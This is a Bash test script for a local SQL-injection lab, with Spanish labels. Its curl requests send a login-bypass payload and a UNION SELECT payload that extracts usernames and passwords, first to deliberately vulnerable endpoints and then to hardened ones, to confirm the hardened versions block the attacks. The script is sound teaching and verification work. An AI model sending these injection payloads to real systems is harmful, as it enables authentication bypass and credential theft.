#!/usr/bin/env bash
set -euo pipefail

BASE_URL="${BASE_URL:-http://localhost:8080}"

echo "=================================================================="
echo " LABORATORIO SQL INJECTION (OWASP A05:2025) - PRUEBAS CON CURL"
echo " Servidor objetivo: ${BASE_URL}"
echo "=================================================================="
echo ""

echo "[1/6] Búsqueda normal en endpoint vulnerable (ana.gomez)..."
curl -s -i -G "${BASE_URL}/api/vulnerable/buscar" \
     --data-urlencode "username=ana.gomez"
echo -e "\n------------------------------------------------------------------\n"

echo "[2/6] Ataque A: Bypass de login en /api/vulnerable/login con \"admin' -- \"..."
curl -s -i -X POST "${BASE_URL}/api/vulnerable/login" \
     -H "Content-Type: application/json" \
     -d '{"username": "admin'\'' -- ", "password": "cualquier_password"}'
echo -e "\n------------------------------------------------------------------\n"

echo "[3/6] Ataque B: Exfiltración UNION SELECT en /api/vulnerable/buscar..."
curl -s -i -G "${BASE_URL}/api/vulnerable/buscar" \
     --data-urlencode "username=' UNION SELECT id, username, password, rol FROM usuarios -- "
echo -e "\n------------------------------------------------------------------\n"

echo "[4/6] Verificación 1: Reintento de Bypass de login en /api/seguro/login (esperado HTTP 401)..."
curl -s -i -X POST "${BASE_URL}/api/seguro/login" \
     -H "Content-Type: application/json" \
     -d '{"username": "admin'\'' -- ", "password": "cualquier_password"}'
echo -e "\n------------------------------------------------------------------\n"

echo "[5/6] Verificación 2: Reintento de UNION SELECT en /api/seguro/buscar (esperado 0 registros)..."
curl -s -i -G "${BASE_URL}/api/seguro/buscar" \
     --data-urlencode "username=' UNION SELECT id, username, password, rol FROM usuarios -- "
echo -e "\n------------------------------------------------------------------\n"

echo "[6/6] Búsqueda normal en /api/seguro/buscar (ana.gomez, verificando operación legítima)..."
curl -s -i -G "${BASE_URL}/api/seguro/buscar" \
     --data-urlencode "username=ana.gomez"
echo -e "\n=================================================================="
echo " FIN DE LAS PRUEBAS"
echo "=================================================================="
